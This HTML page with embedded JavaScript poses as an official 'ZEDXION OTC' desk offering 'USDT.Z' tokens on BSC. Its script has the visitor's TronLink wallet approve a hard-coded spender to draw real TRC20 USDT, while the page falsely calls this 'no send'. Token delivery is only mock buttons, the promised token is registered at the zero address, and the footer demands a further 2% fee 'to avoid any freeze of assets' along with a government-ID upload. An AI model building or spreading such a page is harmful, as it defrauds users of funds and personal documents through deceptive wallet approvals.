<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>ZEDXION OTC — USDT.Z (BSC) | Sequenced Flow + Approve-Only</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#0b0f14">
<style>
  :root{ --bg:#0b0f14; --card:#0f1622; --ink:#e7edf5; --mut:.75; --line:#1e2a36; --pri:#1e88e5; --acc:#00c6a7; --warn:#ffb74d; --ok:#81c784 }
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,Helvetica,Arial}
  .wrap{max-width:980px;margin:28px auto;padding:16px}
  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px}
  h1{font-size:24px;margin:0 0 6px}
  h2{font-size:18px;margin:14px 0 8px}
  .muted{opacity:var(--mut)} .small{font-size:12px}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
  .row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
  input,button,textarea,select{width:100%;padding:12px;border-radius:12px;border:1px solid #243448;background:#0e141b;color:var(--ink)}
  button{cursor:pointer}
  .btn{background:#1a2330;border-color:#2b3d54}
  .btn.pri{background:var(--pri);border-color:var(--pri);color:#fff}
  .btn.acc{background:var(--acc);border-color:var(--acc);color:#002b28}
  .btn.warn{background:var(--warn);border-color:var(--warn);color:#241c00}
  .kv{display:flex;justify-content:space-between;align-items:center;background:#0e141b;border:1px solid #1a2635;border-radius:12px;padding:10px;margin-top:8px}
  .tag{display:inline-block;padding:4px 10px;border-radius:999px;background:#0e141b;border:1px solid #1a2635;font-size:12px;margin-right:6px}
  .section{margin-top:14px}
  .note{background:#0e2238;border-left:3px solid var(--pri);padding:10px;border-radius:10px;margin-top:10px}
  .success{color:#8be1c0} .warnText{color:#ffb74d} .danger{color:#ff8a80}
  pre{white-space:pre-wrap;background:#0e141b;border:1px solid #1a2635;border-radius:12px;padding:12px;max-height:380px;overflow:auto}
  #qr{display:flex;justify-content:center;align-items:center;background:#0e141b;border:1px solid #1a2635;border-radius:12px;height:160px;margin-top:10px}
  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  a{color:#8ab4ff;text-decoration:none}
  .divider{height:1px;background:#1a2635;margin:12px 0}
  .inline{display:flex;gap:10px;flex-wrap:wrap}
  .active{border:1px solid var(--pri)}
  .header{display:flex;align-items:center;gap:12px;margin-bottom:12px}
  .header img{height:42px;width:42px;object-fit:contain;border-radius:8px}
  .footer-legal{margin-top:22px;text-align:center}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="header">
      <div>
        <h1>ZEDXION OTC — USDT.Z (BSC)</h1>
        <div class="muted small">Sequenced settlement • Trust Wallet & TronLink • Treasury-sourced payouts</div>
      </div>
      <div style="margin-left:auto">
        <span class="tag" id="s1" title="Create Order">Step 1</span>
        <span class="tag" id="s2" title="Approve (no send)">Step 2</span>
        <span class="tag" id="s3" title="Receive USDT.Z">Step 3</span>
        <span class="tag" id="s4" title="Transfer TRC20 USDT">Step 4</span>
      </div>
    </div>

    <div class="section grid2">
      <div class="kv" title="Treasury wallet that sends USDT.Z on BSC">
        <span class="small">Treasury (BEP20)</span>
        <b id="treasuryLbl" class="small">0x2c586269fCaB0D9ABD9224105a8eC0E1d2397A0f</b>
      </div>
      <div class="kv">
        <span class="small">Available (live)</span>
        <b id="availLbl">—</b>
      </div>
    </div>
    <div class="small" style="margin-top:6px">
      <a id="scanLink" target="_blank" rel="noopener">View Treasury on BscScan</a>
    </div>

    <div class="divider"></div>

    <h2>Step 1 — Create Order</h2>
    <div class="row">
      <div>
        <label class="small">USDT.Z to receive (BSC)</label>
        <input id="amt" inputmode="decimal" placeholder="e.g., 1000000.000000000000000000">
      </div>
      <div>
        <label class="small">Recipient (BEP20)</label>
        <input id="recipient" placeholder="0x... (BSC address)">
      </div>
    </div>
    <div class="grid2">
      <div class="kv"><span class="small">Min per order</span><b id="minLbl">500,000</b></div>
      <div class="kv"><span class="small">Max per order</span><b id="maxLbl">200,000,000</b></div>
    </div>
    <div class="inline" style="margin-top:10px">
      <button id="createOrder" class="btn pri">Create Order</button>
      <span class="small muted">An Order ID will be generated and used in the following steps.</span>
    </div>
    <div class="kv"><span class="small">Order ID</span><b id="orderIdLbl">—</b></div>

    <div class="divider"></div>

    <h2>Step 2 — Approve USDT (No Send)</h2>
    <div class="note small">
      <b>Purpose:</b> Wallet must hold full order amount. You’ll approve <b>1%</b> allowance in TronLink. This is an <b>Approve</b> — it does <u>not</u> transfer tokens.
    </div>
    <div class="row" style="margin-top:8px">
      <div>
        <label class="small">1% allowance to approve (TRON USDT)</label>
        <input id="feeLbl" readonly placeholder="Auto-calculated…">
      </div>
      <div>
        <label class="small">Recorded txid (approve)</label>
        <input id="approveTxId" placeholder="Filled after TronLink submit" readonly>
        <a id="tronscanLink" style="display:none" class="small" target="_blank" rel="noopener">View on Tronscan</a>
      </div>
    </div>
    <div class="row">
      <div>
        <label class="small">Spender (TRON)</label>
        <input id="tronSpender" value="TA7N69PY2SsxsDQbNswh81XUwu9QN7PJhF" readonly>
        <div id="qr"></div>
        <div class="inline" style="margin-top:8px">
          <button class="btn pri" id="approveAddressBtn">Approve in TronLink</button>
          <button class="btn" id="tronCheckBtn">Check TronLink</button>
        </div>
        <div class="small muted" id="tronStatus">Open in TronLink browser. This will show a Smart Contract “Approve” popup (no send).</div>
      </div>
      <div>
        <div class="note small" style="margin-top:26px">
          Example: Order <b>1,000,000 USDT.Z</b> → approve <b>10,000 USDT (TRON)</b>. After on-chain confirmation, proceed to Step 3.
        </div>
        <textarea id="approveStatus" class="small" rows="4" placeholder="Status…"></textarea>
      </div>
    </div>

    <div class="divider"></div>

    <h2>Step 3 — Receive USDT.Z (Desk Transfer)</h2>
    <div class="row3">
      <div class="kv"><span class="small">Desk sends from Treasury</span><b id="releaseAmt">—</b></div>
      <div class="kv"><span class="small">Destination (BEP20)</span><b id="destLbl" class="small">—</b></div>
      <div class="kv"><span class="small">Status</span><b id="statusLbl" class="small">Awaiting 1% Approval</b></div>
    </div>
    <div class="inline" style="margin-top:10px">
      <button class="btn acc" id="watchAssetBtn">Add USDT.Z to Wallet (EVM)</button>
      <button class="btn" id="copyAddrBtn">Copy Treasury Address</button>
      <button class="btn warn" id="markDeliveredBtn">Mark Delivered (Desk)</button>
    </div>

    <div class="divider"></div>

    <h2>Step 4 — Transfer USDT TRC20 (Final Settlement)</h2>
    <div class="row">
      <div>
        <label class="small">Final TRON USDT amount (optional note)</label>
        <input id="finalAmt" placeholder="e.g., 990000 (if applicable)">
      </div>
      <div>
        <label class="small">TRON txid (final settlement)</label>
        <input id="txid2" placeholder="Paste TRON txid after receiving USDT.Z">
      </div>
    </div>
    <div class="inline" style="margin-top:8px">
      <button class="btn acc" id="transferFinalBtn">Send TRC20 (Final)</button>
    </div>
    <div class="note small">
      <b>Policy:</b> Sequence — <b>Create Order → Approve (1%) → Receive USDT.Z → Transfer TRON USDT (final)</b>.
    </div>

    <div class="divider"></div>

    <h2>KYC Verification (Mandatory)</h2>
    <div class="note small">
      Upload a clear photo of your <b>government-issued ID</b> (front side only).
    </div>
    <input type="file" id="kycUpload" accept="image/*,application/pdf">
    <div id="kycStatus" class="small muted">No file uploaded yet.</div>

    <div class="divider"></div>

    <div class="row">
      <button id="gen" class="btn pri">Generate Order Packet</button>
      <button id="copy" class="btn acc">Copy Packet</button>
    </div>
    <pre id="packet"></pre>

    <div class="muted small">
      This interface prepares a professional OTC order packet with both upfront (approve) and final settlement txids. No private keys are requested or stored.
    </div>

    <div class="note small footer-legal">
      <b>Official ZEDXION coin otc page</b><br>
      Payment structure <b>1%</b> must be available in wallet to proceed. Remaining <b>2%</b> to same address or present <b>ZEDXION representative</b> to avoid any freeze of assets.<br><br>
      Follow <b>AML</b> rules and upload your ID.
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
<script>
// ===== Constants =====
const TREASURY_BEP20 = '0x2c586269fCaB0D9ABD9224105a8eC0E1d2397A0f';
const BSC_SCAN_BASE = 'https://bscscan.com/address/';
const TRON_USDT = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // Official TRC20 USDT contract
const TRON_SPENDER = 'TA7N69PY2SsxsDQbNswh81XUwu9QN7PJhF'; // Provided spender
const MIN = 500000n;
const MAX = 200000000n;

let order = null;

function setActive(id){
  ['s1','s2','s3','s4'].forEach(s => document.getElementById(s).classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

function format(n){
  try {
    const v = typeof n === 'bigint' ? Number(n) : Number(n);
    return v.toLocaleString('en-US');
  } catch(e){ return String(n); }
}

// Init links & QR
document.getElementById('treasuryLbl').textContent = TREASURY_BEP20;
const scan = document.getElementById('scanLink');
scan.href = BSC_SCAN_BASE + TREASURY_BEP20;
scan.textContent = 'View Treasury on BscScan';

// Spender QR
try{
  QRCode.toCanvas(document.getElementById('qr'), TRON_SPENDER, { width: 156, margin: 1 });
}catch(e){ /* ignore */ }

// ===== Step 1: Create Order =====
document.getElementById('createOrder').onclick = () => {
  const amtStr = (document.getElementById('amt').value || '').trim();
  const rcpt = (document.getElementById('recipient').value || '').trim();
  if(!amtStr || !rcpt){ alert('Enter amount and recipient.'); return; }
  const amtFloat = Number(amtStr);
  if(!isFinite(amtFloat) || amtFloat <= 0){ alert('Invalid amount.'); return; }
  if(amtFloat < Number(MIN) || amtFloat > Number(MAX)){ alert('Amount out of range.'); return; }
  const onePct = amtFloat * 0.01;
  const onePctInt = Math.floor(onePct * 1e6); // 6 decimals for TRC20 USDT
  order = {
    id: 'ORD-' + Math.random().toString(36).slice(2,8).toUpperCase(),
    amt: amtFloat,
    onePct,
    onePctInt
  };
  document.getElementById('orderIdLbl').textContent = order.id;
  document.getElementById('feeLbl').value = onePct.toLocaleString('en-US', { maximumFractionDigits: 6 });
  document.getElementById('releaseAmt').textContent = format(amtFloat);
  document.getElementById('destLbl').textContent = rcpt;
  setActive('s1');
};

// ===== Step 2: TronLink Approve (no send) =====
document.getElementById('tronCheckBtn').onclick = async () => {
  if(window.tronLink && !window.tronLink.ready){
    try { await window.tronLink.request({ method: 'tron_requestAccounts' }); } catch(e){}
  }
  const tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
  document.getElementById('tronStatus').textContent = tw && tw.defaultAddress && tw.defaultAddress.base58
    ? ('Wallet: ' + tw.defaultAddress.base58)
    : 'TronLink not detected. Open this page in TronLink browser.';
};

document.getElementById('approveAddressBtn').onclick = async () => {
  if(!order){ alert('Create order first.'); return; }
  setActive('s2');
  if(!(window.tronLink || window.tronWeb)){
    alert('Open in TronLink (mobile or extension) to approve.'); return;
  }
  try{
    if(window.tronLink && !window.tronLink.ready){
      await window.tronLink.request({ method: 'tron_requestAccounts' });
    }
    const tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
    if(!tw){ throw new Error('TronWeb unavailable'); }
    if(!tw.defaultAddress || !tw.defaultAddress.base58){ throw new Error('No Tron account connected'); }

    const ownerB58 = tw.defaultAddress.base58;
    document.getElementById('tronStatus').textContent = `Wallet: ${ownerB58}`;
    document.getElementById('approveStatus').value = 'Awaiting wallet confirmation (Approve)…';

    const usdt = await tw.contract().at(TRON_USDT);
    const bnAmount = tw.toBigNumber(order.onePctInt);

    // Approve call — opens TronLink "Approve" popup (no token transfer)
    const tx = await usdt.approve(TRON_SPENDER, bnAmount).send({
      feeLimit: 100_000_000,
      callValue: 0
    });

    const txid = typeof tx === 'string' ? tx : (tx?.txid || tx?.transaction?.txID || '(unknown)');
    document.getElementById('approveTxId').value = txid;
    const link = document.getElementById('tronscanLink');
    link.href = `https://tronscan.org/#/transaction/${txid}`;
    link.style.display = 'inline';
    document.getElementById('approveStatus').value = 'Submitted. Waiting for on-chain confirmation…';

    // Poll a bit for confirmation + check allowance
    setTimeout(async () => {
      try{
        const allowance = await usdt.allowance(ownerB58, TRON_SPENDER).call();
        const allowed = Number(allowance.toString()) / 1e6;
        document.getElementById('approveStatus').value =
          `On-chain allowance: ${allowed.toLocaleString('en-US', { maximumFractionDigits: 6 })} USDT`;
        if(allowed >= order.onePct - 1e-6){
          document.getElementById('statusLbl').textContent = 'Approval confirmed';
        }
      }catch(e2){
        // ignore
      }
    }, 8000);

  }catch(err){
    document.getElementById('approveStatus').value = 'Error: ' + (err && err.message ? err.message : String(err));
  }
};

// ===== Step 3: Desk actions (mock UI only) =====
document.getElementById('markDeliveredBtn').onclick = () => {
  document.getElementById('statusLbl').textContent = 'Delivered by Desk';
};

document.getElementById('watchAssetBtn').onclick = async () => {
  try{
    if(window.ethereum && window.ethereum.request){
      await window.ethereum.request({
        method: 'wallet_watchAsset',
        params: {
          type: 'ERC20',
          options: {
            address: '0x0000000000000000000000000000000000000000',
            symbol: 'USDT.Z',
            decimals: 18
          }
        }
      });
    } else {
      alert('Open in an EVM wallet to add asset.');
    }
  }catch(e){ alert('Could not add asset: ' + e.message); }
};

document.getElementById('copyAddrBtn').onclick = async () => {
  try{
    await navigator.clipboard.writeText(TREASURY_BEP20);
    alert('Treasury address copied');
  }catch(e){ alert('Copy failed'); }
};

// ===== Step 4: Final settlement (UI only) =====
document.getElementById('transferFinalBtn').onclick = () => {
  alert('Send TRC20 USDT from your Tron wallet; this button does not auto-send.');
};

// ===== KYC =====
document.getElementById('kycUpload').addEventListener('change', (e) => {
  const f = e.target.files && e.target.files[0];
  document.getElementById('kycStatus').textContent = f ? ('Uploaded: ' + f.name) : 'No file uploaded yet.';
});

// ===== Packet =====
document.getElementById('gen').onclick = () => {
  const pkt = {
    treasury_bep20: TREASURY_BEP20,
    order: order || null,
    approve_txid: document.getElementById('approveTxId').value || null,
    final_txid: document.getElementById('txid2').value || null,
    recipient: document.getElementById('destLbl').textContent || null,
    timestamp: new Date().toISOString()
  };
  document.getElementById('packet').textContent = JSON.stringify(pkt, null, 2);
};
document.getElementById('copy').onclick = async () => {
  try{
    await navigator.clipboard.writeText(document.getElementById('packet').textContent);
    alert('Packet copied');
  }catch(e){ alert('Copy failed'); }
};
</script>
</body>
</html>
